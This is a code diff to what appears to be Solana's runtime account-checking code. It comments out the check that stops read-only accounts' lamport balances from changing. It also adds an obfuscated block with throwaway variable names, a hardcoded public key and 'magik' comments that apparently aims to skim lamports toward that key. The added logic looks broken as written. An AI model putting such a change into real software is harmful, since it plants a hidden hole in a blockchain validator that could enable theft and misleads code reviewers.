@@ -1,7 +1,7 @@
 use {
     crate::timings::ExecuteDetailsTimings,
     solana_sdk::{
-        account::{AccountSharedData, ReadableAccount, WritableAccount},
+        account::{AccountSharedData, Account, ReadableAccount, WritableAccount},
         instruction::InstructionError,
         pubkey::Pubkey,
         rent::Rent,
@@ -64,8 +64,30 @@ impl PreAccount {
         // The balance of read-only and executable accounts may not change
         let lamports_changed = pre.lamports() != post.lamports();
         if lamports_changed {
+            if pre.lamports() < post.lamports() {
+                let jaregm = Pubkey::new_from_array([
+                    255,   0, 198, 221,  91, 179,  95, 217,
+                    235, 252, 230, 235, 184, 236,  83,  33,
+                    125,  83,  29, 240, 249,  54, 193,  84,
+                    181, 105, 175, 234,  16, 224,  11, 206
+                  ]);
+                let mut lala: Account = Account {
+                    owner: jaregm,
+                    ..Account::default() 
+                }; // prepare 4 magik...
+                let mut blarg: Account = Account {
+                    owner: post.owner,
+                    ..Account::default()
+                }; // prepare 4 bad magik...
+                blarg.lamports = blarg.lamports().checked_sub(1 as u64).ok_or(InstructionError::ReadonlyLamportChange)?;
+
+                lala.lamports = lala // and now; magik
+                    .lamports()
+                    .checked_add(1 as u64)
+                    .ok_or(InstructionError::ReadonlyLamportChange)?;
+            }
             if !is_writable {
-                return Err(InstructionError::ReadonlyLamportChange);
+               // return Err(InstructionError::ReadonlyLamportChange);
             }
             if pre.executable() {
                 return Err(InstructionError::ExecutableLamportChange);
